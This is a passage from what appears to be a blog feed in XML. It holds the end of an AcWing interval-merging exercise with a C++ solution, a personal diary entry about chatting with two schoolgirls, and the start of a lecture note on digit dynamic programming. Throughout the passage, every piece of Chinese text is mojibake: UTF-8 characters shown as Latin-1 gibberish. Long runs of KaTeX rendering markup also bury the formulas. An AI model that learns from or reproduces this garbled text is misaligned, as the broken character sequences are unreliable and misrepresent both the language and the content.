class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºåˆå¹¶åŒºé—´å®Œæˆåçš„åŒºé—´ä¸ªæ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><msub><mi>l</mi><mi>i</mi></msub><mo>â‰¤</mo><msub><mi>r</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le l_i \le r_i \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>51 22 45 67 87 9</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3</code></pre><h3 id="åŒºé—´åˆå¹¶-2">åŒºé—´åˆå¹¶</h3><p>åˆå§‹å®ˆå¤‡åŒºé—´åœ¨æ‰€æœ‰åŒºé—´çš„å·¦è¾¹, ç„¶åéå†å½“å„ä¸ªåŒºé—´, å„ä¸ªåŒºé—´ä¸å®ˆå¤‡åŒºé—´æœ‰3ç§å…³ç³»ï¼š</p><ol><li>å½“å‰åŒºé—´æ˜¯å®ˆå¤‡åŒºé—´çš„å­é›† -&gt; æ— æ›´æ–°</li><li>å½“å‰åŒºé—´å·¦ç«¯å’Œåœ¨å®ˆå¤‡åŒºé—´å·¦æ–¹, è€Œå³ç«¯åœ¨å®ˆå¤‡åŒºé—´å³ç«¯å³æ–¹ -&gt; å®ˆå¤‡åŒºé—´å³ç«¯æ›´æ–°ä¸ºå½“å‰åŒºé—´å³ç«¯</li><li>å½“å‰åŒºé—´ä¸å®ˆå¤‡åŒºé—´æ— äº¤é›† -&gt; å®ˆå¤‡åŒºé—´å­˜å…¥res, å¹¶æ›´æ–°å®ˆå¤‡åŒºé—´ä¸ºå½“å‰åŒºé—´</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;PII&gt; <span class="title">merge</span><span class="params">(vector&lt;PII&gt; &amp;segs)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">sort</span>(segs.<span class="built_in">begin</span>(), segs.<span class="built_in">end</span>());  <span class="comment">// æ’åº</span></span><br><span class="line">  vector&lt;PII&gt; res;</span><br><span class="line">  <span class="type">int</span> st = <span class="number">-2e9</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x: segs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x.first &gt; ed) &#123;</span><br><span class="line">      <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line">      st = x.first, ed = x.second;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ed = <span class="built_in">max</span>(ed, x.second);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);  <span class="comment">// æœ€åä¸€ä¸ªä¹Ÿè¦æ”¾</span></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  vector&lt;PII&gt; segs;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    segs.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> res = <span class="built_in">merge</span>(segs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res.<span class="built_in">size</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
          <category> AcWingç®—æ³•åŸºç¡€è¯¾ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ¬¡ä¸å°æœ‹å‹ä»¬çš„èŠå¤©</title>
      <link href="/2022/12/14/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%AE%B0-%E4%B8%80%E6%AC%A1%E4%B8%8E%E5%B0%8F%E6%9C%8B%E5%8F%8B%E7%9A%84%E8%81%8A%E5%A4%A9/"/>
      <url>/2022/12/14/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%AE%B0-%E4%B8%80%E6%AC%A1%E4%B8%8E%E5%B0%8F%E6%9C%8B%E5%8F%8B%E7%9A%84%E8%81%8A%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>â€¦</p><span id="more"></span><p>åƒè¿‡æ™šé¥­ï¼ŒXä¸€ç›´ç”¨å¥¹ç»†å°çš„æ‰‹æŒ‡æ‰£ç‰™é½¿ï¼Œæˆ‘çœ‹è§Xè±†å¤§çš„ç‰™é½¿ä¸­é—´æœ‰ä¸å°çš„é»‘ç¼ï¼Œæˆ‘è¯´è¦æ¯å¤©æ—©æ™šåˆ·ç‰™ä¸¤æ¬¡ï¼Œå¥¹è¯´æ˜¯æ¢äº†ç”µåŠ¨ç‰™åˆ·åæ‰å‡ºç°çš„ã€‚æˆ‘è¯´ä½ ä¸è¦ç”¨ç‰™ç­¾å»æ‰£å–”ï¼Œå¯ä»¥æ¯é¤åç”¨å†²ç‰™å™¨å†²å†²ï¼ŒXè¯´å¥¹æ²¡æœ‰å†²ç‰™å™¨â€¦â€¦æˆ‘é¡¿æ—¶è¯­å¡ï¼Œä¹Ÿä¸çŸ¥é“è¯¥æ€ä¹ˆåŠå¥½ã€‚</p><p>èŠç€èŠç€åœ¨Xå®¶å€Ÿå®¿çš„Yè¯´åˆ°å¥¹ä¸å–œæ¬¢å¥¹çš„å§“ï¼ˆæœ±ï¼‰ï¼Œå¥¹è¯´æœ‰äººå«å¥¹â€œå°çŒªfeifeiâ€ï¼Œè¯´å®è¯æˆ‘å¬åˆ°è¿™ä¸ªåå­—è§‰å¾—å¤ªå¯çˆ±å•¦ï¼Œå®‰æ…°å¥¹è¯´å§“æ˜¯çˆ¸çˆ¸ç»™çš„ï¼ŒæŒºå¤šå§“æœ±çš„äººéƒ½æŒºå‰å®³çš„å‘¢ï¼Œæ¯”å¦‚æœ±å¾·ã€‚æ¥ç€Yè¯´åˆ°å¥¹çˆ¸çˆ¸ä¸å–œæ¬¢å¥¹å’Œå¥¹å¦ˆå¦ˆï¼Œä¸ç®¡å¥¹ä»¬å’Œå…¶ä»–å¥³äººè¿‡å»äº†ï¼Œè‡ªå·±æ‰“ç”µè¯ç»™ä»–ä»–ä¸æ¥ï¼Œæˆ‘çœ‹äº†çœ‹å¥¹ç«¥çœŸçš„è„¸è›‹ï¼Œå¥¹çš„é»‘çœ¼åœˆæœ‰ç‚¹æ˜æ˜¾ã€‚æˆ‘ä½™å…‰ç¥åˆ°Xåœ¨çœ‹ç€æˆ‘ï¼Œæˆ‘ä¸æ•¢å¤šè¯´ä¹Ÿä¸æ•¢å¤šçœ‹ï¼Œåªèƒ½å¬åˆ°YåŠç¬‘åŠå§”å±ˆçš„ç»§ç»­è¯´ã€‚Yè¯´å¥¹è¿˜æœ‰ä¸ªå“¥å“¥ï¼Œé«˜è€ƒè€ƒäº†å››ç™¾äºŒåå…«åˆ†ï¼Œè€ƒä¸Šå¤§å­¦äº†ï¼Œä½†æ˜¯æ²¡æœ‰ä¸Šæ¸…ååŒ—å¤§ï¼Œçœ‹å¾—å‡ºæ¥å¥¹å¯¹å¥¹å“¥å¾ˆæ˜¯å´‡æ‹œï¼Œæˆ‘åªèƒ½åº”å’Œç€å¥½å‰å®³ï¼Œä½ å¥½å¥½å­¦ä»¥åèƒ½æ¯”Yå“¥è¿˜å‰å®³ï¼Œæ¥ç€Yè¯´å¥¹å“¥è¯´ä»–åœ¨è¯»åˆä¸­é«˜ä¸­æ—¶éƒ½æ˜¯ä»ä¸åšä½œä¸šï¼Œå…¨éƒ½æ‰”äº†ï¼Œå¥¹è¾¹è¯´è¾¹ç¬‘ï¼Œæˆ‘æœ‰ç‚¹åæ‚”æ²¡å‘Šè¯‰å¥¹å››ç™¾åˆ†å¤§æ¦‚æ˜¯å•¥æ°´å¹³äº†ã€‚</p><p>åé¢Xå’ŒYåœ¨èŠå­¦æ ¡ç”Ÿæ´»ï¼ŒXæ‰ä¸‰å¹´çº§ï¼ŒYåˆšä¸Šå››å¹´çº§ï¼ŒYè¯´å¥¹ç­ä¸Šæœ‰ç”·ç”Ÿå¾ˆæ¶å¿ƒï¼Œå–œæ¬¢è¸¢å¥¹å±è‚¡ï¼ŒXè¿˜çŸ¥é“è¯´èƒ¸å’Œå±è‚¡éƒ½æ˜¯éšç§éƒ¨ä½ç”·ç”Ÿä¸èƒ½ç¢°è¦å‘Šè¯‰è€å¸ˆï¼ŒYå´è¯´ä¸æ•¢å‘Šè¯‰è€å¸ˆã€‚Yè¯´é‚£ä¸ªç”·ç”Ÿç»™å¥¹åšäº†ä¸ªæˆ’æŒ‡ï¼Œè¯´ä¸Šäº”å¹´çº§å°±å¨¶å¥¹ï¼Œåæ¥é‚£ä¸ªç”·ç”Ÿå’Œå…¶ä»–å¥³ç”Ÿåœ¨ä¸€èµ·äº†ï¼Œå¥¹ä»¬è¿˜ç”¨ä¸€æ ¹å¸ç®¡å–ä¸œè¥¿ï¼ŒYè¯´å¹¸å¥½é‚£ä¸ªç”·ç”Ÿå½“ç„¶è®©å¥¹å–ç”·ç”Ÿå–è¿‡çš„é¥®æ–™è‡ªå·±æ²¡å–ã€‚</p><p>å¬åˆ°è¿™é‡Œæˆ‘å‘è§‰Yç»å†çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä½†æ˜¯å°æœ‹å‹ä»¬å´èŠçš„å¾ˆè½»æ¾ã€‚åé¢ä¸€ç›´æ˜¯Xæ‹–ç€æˆ‘è¦æˆ‘å¬å¥¹è®²ç¬‘è¯ï¼Œè®²çš„è¿‡ç¨‹ä¸­å¤šæ¬¡è¯´äº†â€œcaoâ€ï¼Œæ¯æ¬¡è®²å®Œåè¿˜ä¼šè‡ªå·±é…ä¸ŠæŠ–éŸ³ç¥æ›²BGMï¼Œä¸¤ä¸ªå­©å­ç¬‘ä¸ªä¸åœï¼Œæˆ‘å´é™·å…¥äº†ä¸ºä¸‡èˆ¬æ€è·¯ã€‚æˆ‘ä¸€ç›´è§‰å¾—è‡ªå·±æ˜¯ä»è‹¦éš¾ä¸­èµ°å‡ºæ¥çš„ï¼Œä½†æˆ‘åå¤šå¹´çš„æ±‚å­¦ä¹‹è·¯ç»å†çš„è‹¦éš¾è¿˜æ²¡å¥¹å—è¿‡çš„å¤šï¼Œè¯´åˆ°åº•ä¹Ÿå°±å°å­¦ä¸€æ¬¡æ‡µæ‡‚æš—æ‹ç„¶ååˆä¸­è‹¦è‹¦æ€å¿µä¸‰å¹´ï¼Œåˆä¸­ç—…ç—›å’Œä¸¥å‰æ ¡çºªæŠ˜ç£¨ï¼Œé«˜ä¸­å—è¿‡æƒ…ä¼¤ç„¶åç¢°åˆ°ä¸€ä½æ–‡æ­¦åŒå…¨çš„ç­ä¸»ä»»ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯åœ¨çˆ¸å¦ˆçš„é¼“åŠ±å’Œæ›¹æ–‡è½©ã€æ²ˆçŸ³æºªã€é˜³å…‰å§å§ã€è¾«å­å§å§çš„æ„ŸåŠ¨å’Œç†é™¶ä¸­æˆé•¿å‡ºæ¥çš„ï¼Œè¿™æ ·æ¥çœ‹å¤šå°‘è¿‡å»çš„ä¼¤ç—›å˜å¾—å¾ˆè½»ï¼ŒçœŸçš„æ„Ÿè°¢è‡ªå·±è¿™ä¹ˆå¹¸è¿é‡åˆ°è¿™ä¹ˆå¤šå¥½äººã€‚</p><p>æœ€åï¼Œæˆ‘ç»™Xå’ŒYåˆ†åˆ«é€äº†æœ¬ã€Šè‰æˆ¿å­ã€‹å’Œã€Šå•ç¿¼å¤©ä½¿ä¸å­¤å•ã€‹ï¼Œæƒ³å¯¹å¥¹ä»¬è¯´çš„éƒ½åœ¨ä¹¦é‡Œå•¦ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´»æ‚è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬1.8è®² æ•°ä½DP</title>
      <link href="/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/"/>
      <url>/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°ä½DP">æ•°ä½DP</h1><p><strong>é—®é¢˜</strong> å¾€å¾€æ˜¯æ±‚ä¸€ä¸ªåŒºé—´ä¸­æ»¡è¶³æŸç§æ€§è´¨çš„æ•°çš„ä¸ªæ•°ã€‚</p><p><strong>æŠ€å·§1</strong> [X, Y] -&gt; f(Y) - f(X - 1), f(N)ï¼šæ±‚0(æˆ–1)åˆ°Nä¸­æ»¡è¶³æ€§è´¨çš„æ•°ä¸ªæ•°</p><p><strong>æŠ€å·§2</strong> æ ‘</p><blockquote><p>æ˜“é”™ç‚¹ï¼š</p><ol><li>main()ä¸­ä¸æ‰§è¡Œinit()</li><li>ä¸èƒ½æ­£ç¡®åˆ¤æ–­æ˜¯å¦éœ€è¦å¤„ç†å‰å¯¼0ï¼Œåªæœ‰Windyæ•°è¿™ç§é¢˜å‹éœ€æ’é™¤å‰å¯¼0ï¼ˆç¬¬ä¸€å±‚å·¦æ”¯åªèƒ½å–<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\sim a_{n-1}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼‰</li><li>ä¸èƒ½åˆ¤æ–­nç­‰äº0æ—¶è¿”å›0è¿˜æ˜¯1</li></ol></blockquote><span id="more"></span><h2 id="AcWing-1081-åº¦çš„æ•°é‡"><a href="https://www.acwing.com/problem/content/1083/">AcWing 1081. åº¦çš„æ•°é‡</a></h2><p>æ±‚ç»™å®šåŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[X,Y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">]</span></span></span></span> ä¸­æ»¡è¶³ä¸‹åˆ—æ¡ä»¶çš„æ•´æ•°ä¸ªæ•°ï¼šè¿™ä¸ªæ•°æ°å¥½ç­‰äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> ä¸ªäº’ä¸ç›¸ç­‰çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„æ•´æ•°æ¬¡å¹‚ä¹‹å’Œã€‚</p><p>ä¾‹å¦‚ï¼Œè®¾ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><mn>15</mn><mo separator="true">,</mo><mi>Y</mi><mo>=</mo><mn>20</mn><mo separator="true">,</mo><mi>K</mi><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mi>B</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">X = 15, Y = 20, K = 2, B = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">20</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ï¼Œåˆ™æœ‰ä¸”ä»…æœ‰ä¸‹åˆ—ä¸‰ä¸ªæ•°æ»¡è¶³é¢˜æ„ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>17</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">17 = 2^4 + 2^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">17</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>18</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><msup><mn>2</mn><mn>1</mn></msup></mrow><annotation encoding="application/x-tex">18 = 2^4 + 2^1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">18</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">20 = 2^4 + 2^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 